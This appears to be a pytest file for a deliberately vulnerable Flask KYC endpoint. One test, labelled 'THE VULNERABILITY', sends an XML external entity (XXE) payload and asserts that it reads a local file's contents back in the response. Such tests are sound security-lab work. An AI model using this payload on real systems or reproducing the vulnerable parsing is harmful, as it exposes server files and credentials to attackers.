import os
import tempfile
import pytest


@pytest.fixture
def app():
    from app import create_app, db
    from app.core.models import User
    from werkzeug.security import generate_password_hash

    application = create_app(config_object="config.TestConfig")
    application.config["TESTING"] = True

    with application.app_context():
        db.drop_all()
        db.create_all()
        db.session.add(User(id=1, username="attacker", email="a@test.local",
                             password_hash=generate_password_hash("Password123!"), role="customer"))
        db.session.commit()
        yield application


@pytest.fixture
def client(app):
    return app.test_client()


def _login(client):
    client.post("/login", data={"username": "attacker", "password": "Password123!"})


def test_normal_xml_parses_correctly(client):
    _login(client)
    xml = b"""<?xml version="1.0"?>
    <kyc>
        <companyName>Acme Corp</companyName>
        <registrationNumber>REG123</registrationNumber>
        <contactEmail>test@acme.com</contactEmail>
    </kyc>"""
    resp = client.post("/kyc/submit-xml", data=xml, content_type="application/xml")
    assert resp.status_code == 200
    assert resp.get_json()["company_name"] == "Acme Corp"


def test_xxe_reads_local_file(client):
    """THE VULNERABILITY. External entity resolves a local file's
    content into the response."""
    _login(client)

    # write a marker file with known content to read back via XXE
    fd, path = tempfile.mkstemp()
    with os.fdopen(fd, "w") as f:
        f.write("xxe-marker-content-12345")

    xml = f"""<?xml version="1.0"?>
    <!DOCTYPE kyc [<!ENTITY xxe SYSTEM "file://{path}">]>
    <kyc>
        <companyName>&xxe;</companyName>
        <registrationNumber>REG123</registrationNumber>
        <contactEmail>test@acme.com</contactEmail>
    </kyc>""".encode()

    resp = client.post("/kyc/submit-xml", data=xml, content_type="application/xml")
    assert resp.status_code == 200
    assert "xxe-marker-content-12345" in resp.get_json()["company_name"]

    os.remove(path)


def test_requires_login(client):
    resp = client.post("/kyc/submit-xml", data=b"<kyc></kyc>", content_type="application/xml")
    assert resp.status_code == 401
